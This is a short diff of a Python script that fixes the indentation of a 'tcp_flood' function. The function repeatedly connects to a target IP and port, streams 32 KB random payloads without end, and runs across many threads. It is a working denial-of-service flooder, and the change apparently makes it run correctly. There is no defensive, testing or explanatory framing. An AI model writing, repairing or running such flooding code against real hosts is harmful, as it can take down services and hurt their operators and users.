@@ -14,16 +14,16 @@ def random_payload(size=32768):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()       
 def tcp_flood():
         while True:
-        try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect((TARGET_IP, TARGET_PORT))
-                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                while True:
-                        s.sendall(random_payload(32768))
-        except Exception:
-                s.close()
-                time.sleep(0.01)
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(1)
+                        s.connect((TARGET_IP, TARGET_PORT))
+                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                        while True:
+                                s.sendall(random_payload(32768))
+                except Exception:
+                        s.close()
+                        time.sleep(0.01)
         
 threads = []
 for i in range(NUM_THREADS):
